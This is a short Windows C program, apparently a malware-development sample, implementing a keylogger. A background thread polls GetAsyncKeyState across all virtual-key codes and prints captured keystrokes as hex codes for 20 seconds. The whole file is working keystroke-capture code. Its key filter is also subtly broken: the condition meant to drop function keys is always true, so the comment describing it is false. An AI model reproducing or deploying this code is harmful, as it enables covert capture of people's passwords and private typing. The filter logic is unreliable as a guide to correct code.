#include <windows.h>
#include <stdio.h>

#define MONITOR_TIME   20000 // monitor keyboard keystrokes for 20 seconds

VOID KeyboardClicksLogger() {
    SHORT state = NULL;
    printf("[*] Output: ");

	while (TRUE) {
        // Sleep for better performance
        // We dont need to query every clock cycle so lets sleep for 10 milliseconds
        Sleep(10);
        
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // Range from 0x01-0xFE
		for (int i = 1; i < 255; i++) {
            // Get state
            state = GetAsyncKeyState(i);
			// https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
            // 1        = press
            // -32767   = held down
            if (state == 1 || state == -32767) {
                // Remove mouse inputs (0x01-0x07), fn keys (0x70-0x8F)
                if (( 7 < i) && ( 120 < i || i < 143))
				    printf("\\x%02X", i);
            }
		}
	}
    
    return;
}

int main() {
    HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("[i] Thread %d Is Created To Monitor Keyboard Clicks For %d Seconds\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(hThread, MONITOR_TIME);
    }

    return 0;
}